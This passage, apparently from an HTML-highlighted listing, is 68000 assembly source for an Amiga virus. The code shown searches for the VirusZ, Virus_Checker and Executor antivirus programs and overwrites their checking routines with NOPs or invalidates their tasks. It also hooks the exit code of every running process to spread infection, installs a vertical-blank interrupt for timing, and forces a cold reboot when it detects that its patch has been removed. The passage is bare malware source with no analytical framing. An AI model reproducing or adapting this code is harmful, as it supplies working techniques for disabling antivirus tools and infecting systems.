    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$0c400002</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       </span><span class="sc1">;cmpi.w #2,d0</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">VirusZ1</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">VirusZ1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$b07c0002</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       </span><span class="sc1">;cmp.w #2,d0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a1</span><span class="sc4">,</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">cmp.b</span><span class="sc0">   #</span><span class="sc5">$67</span><span class="sc4">,(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;beq.x</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">find_VirusZ_IDCMP_checker</span><span class="sc0">
    </span><span class="sc5">tst.b</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">IDCMP_checker_found</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">a2</span><span class="sc0">
    
</span><span class="sc5">IDCMP_checker_found</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">),</span><span class="sc5">d3</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">d2</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">find_VirusZ_IDCMP_checker</span><span class="sc0">

</span><span class="sc5">stop_VirusZ</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$4e75</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusZ_stopped</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$4e71</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">stop_VirusZ</span><span class="sc0">

</span><span class="sc5">VirusZ_stopped</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">mark_killed_task</span><span class="sc0">

</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc5">kill_Virus_Checker</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">pr_ExitData</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusChecker_stopped</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">128</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">      </span><span class="sc1">;seglist</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">          </span><span class="sc1">;if NULL, system may crash</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusChecker_stopped</span><span class="sc0">    </span><span class="sc1">;mark task as stopped</span><span class="sc0">
    </span><span class="sc5">lsl.l</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">           </span><span class="sc1">;convert from BCPL</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">12</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">;get adress of 1st hunk</span><span class="sc0">
    </span><span class="sc5">lsl.l</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">           </span><span class="sc1">;convert from BCPL</span><span class="sc0">
    </span><span class="sc5">add.l</span><span class="sc0">   #</span><span class="sc2">8000</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;add 8000 bytes to start offset</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc2">400</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">         </span><span class="sc1">;search counter</span><span class="sc0">
    </span><span class="sc5">exg</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">

</span><span class="sc5">find_VC_mem_checker</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">$7202b280</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;moveq #2,d1; cmp.l d0,d1</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_VirusChecker_BSR_found</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">find_VC_mem_checker</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
    
</span><span class="sc5">_VirusChecker_BSR_found</span><span class="sc0">
    </span><span class="sc5">cmp.b</span><span class="sc0">   #</span><span class="sc5">$66</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;beq.x</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">find_VC_mem_checker</span><span class="sc0">
    </span><span class="sc5">tst.b</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;.b? or .w?</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_VC_mem_checker_found</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">

</span><span class="sc5">_VC_mem_checker_found</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">

</span><span class="sc5">stop_VirusChecker</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">and.w</span><span class="sc0">   #</span><span class="sc5">$ff00</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$6000</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">;this 'bra' ends routine</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusChecker_stopped</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$4e71</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">        </span><span class="sc1">;overwrite routine by NOPs</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">stop_VirusChecker</span><span class="sc0">

</span><span class="sc5">VirusChecker_stopped</span><span class="sc0">
</span><span class="sc5">mark_killed_task</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">pr_ExitData</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0"> 
</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc5">kill_Executor</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">62</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">Executor_code</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc4">[(</span><span class="sc5">end_Executor_code</span><span class="sc4">-</span><span class="sc5">Executor_code</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">]-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">

</span><span class="sc5">compare_Executor_code</span><span class="sc0">
    </span><span class="sc5">cmpm.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)+,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">not_Executor</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">compare_Executor_code</span><span class="sc0">
    </span><span class="sc5">clr.b</span><span class="sc0">   </span><span class="sc2">15</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;set tc_State to INVALID</span><span class="sc0">
    </span><span class="sc5">clr.l</span><span class="sc0">   </span><span class="sc2">22</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;clear all signals</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">mark_killed_task</span><span class="sc0">
</span><span class="sc5">not_Executor</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

</span><span class="sc5">Executor_code</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_shit</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">(</span><span class="sc5">a7</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
</span><span class="sc5">_shit</span><span class="sc0">   </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">$1208</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,-(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">$1828</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">$1204</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">subq.l</span><span class="sc0">  #</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc5">$1820</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">end_Executor_code</span><span class="sc0">
</span><span class="sc5">background_name</span><span class="sc0"> </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'Background CLI'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">EVEN</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_install_patches</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">  
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_tracer</span><span class="sc0">             </span><span class="sc1">;find all needed dos &amp; exec</span><span class="sc0">
                        </span><span class="sc1">;adresses</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">FINDTASK</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">ramlib_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_exec_caller</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_ramlib_ok</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">DebugData</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
    
</span><span class="sc5">_ramlib_ok</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">ramlib_task_ptr</span><span class="sc4">-</span><span class="sc5">ramlib_name</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">tc_SPUpper</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">ExitCode_ptr</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">LibList</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">dos_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_FindName</span><span class="sc0">           </span><span class="sc1">;get dosbase</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_rts2</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">dos_base</span><span class="sc4">-</span><span class="sc5">dos_name</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">LibList</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">xvs_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_FindName</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_no_xvs</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">xvs_base</span><span class="sc4">-</span><span class="sc5">xvs_name</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_add_VBlank_routine</span><span class="sc0">

</span><span class="sc5">_no_xvs</span><span class="sc0">
    </span><span class="sc5">clr.l</span><span class="sc0">   </span><span class="sc5">xvs_base</span><span class="sc4">-</span><span class="sc5">xvs_name</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_add_VBlank_routine</span><span class="sc0"> 
</span><span class="sc1">;   rts                 ;for debug</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_interrupt</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">interrupt_names</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc5">$dff00a</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">lsr.b</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">and.w</span><span class="sc0">   #</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_VBlank_counter</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$2000</span><span class="sc4">,(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">    
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc2">14</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">ADDINTSERVER</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_exec_caller</span><span class="sc0">

</span><span class="sc5">_rts2</span><span class="sc0">   </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_infect_processes</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">ramlib_task_ptr</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a3</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">tc_SPUpper</span><span class="sc4">(</span><span class="sc5">a3</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">TaskWait</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">         </span><span class="sc1">;TaskWait</span><span class="sc0">
</span><span class="sc5">_1</span><span class="sc0">
    </span><span class="sc5">cmp.b</span><span class="sc0">   #</span><span class="sc5">$d</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;process?   </span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_get_next_task</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">_infect_process</span><span class="sc0"> 

</span><span class="sc5">_get_next_task</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_process_infecting_done</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">             </span><span class="sc1">;next task</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_1</span><span class="sc0">  

</span><span class="sc5">_process_infecting_done</span><span class="sc0"> 
    </span><span class="sc5">rts</span><span class="sc0"> 
    
</span><span class="sc5">_infect_process</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_rts</span><span class="sc0">
    
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">tc_SPUpper</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_rts</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_new_ExitCode</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,-</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;insert new ExitCode</span><span class="sc0">
</span><span class="sc5">_rts</span><span class="sc0">    </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_new_ExitCode</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">-</span><span class="sc5">a6</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_VBlank_counter</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">tst.w</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.w</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch2</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc2">20</span><span class="sc4">*</span><span class="sc2">50</span><span class="sc4">,(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;20 s. from last infection</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">DebugData</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">         </span><span class="sc1">;interrupt active?</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_virus_is_active</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ColdReboot</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;if not, AV program detected</span><span class="sc0">
                        </span><span class="sc1">;and removed our patch - then</span><span class="sc0">
                        </span><span class="sc1">;RESET!!!</span><span class="sc0">
</span><span class="sc5">_virus_is_active</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_retro</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">ramlib_task_ptr</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">pr_HomeDir</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_kick_SnoopDos</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">pr_CurrentDir</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_kick_SnoopDos</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">ThisTask</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">

</span><span class="sc5">get_locks</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">pr_HomeDir</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_kick_SnoopDos</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">pr_CurrentDir</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_kick_SnoopDos</span><span class="sc0">

</span><span class="sc5">get_next_process</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.w</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">cmp.b</span><span class="sc0">   #</span><span class="sc5">$d</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">get_next_process</span><span class="sc0">
